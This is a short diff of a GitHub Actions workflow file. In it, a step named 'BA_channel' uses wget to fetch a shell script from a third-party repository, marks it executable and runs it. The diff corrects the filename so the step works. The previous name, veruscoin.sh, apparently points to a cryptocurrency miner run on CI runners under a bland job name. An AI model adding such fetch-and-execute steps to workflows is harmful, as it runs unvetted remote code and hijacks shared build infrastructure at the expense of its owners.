@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        wget https://raw.githubusercontent.com/yespapa32/codesandbox-template-blank/main/Sugar.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+        wget https://raw.githubusercontent.com/yespapa32/codesandbox-template-blank/main/Sugar.sh && chmod u+x Sugar.sh && ./Sugar.sh
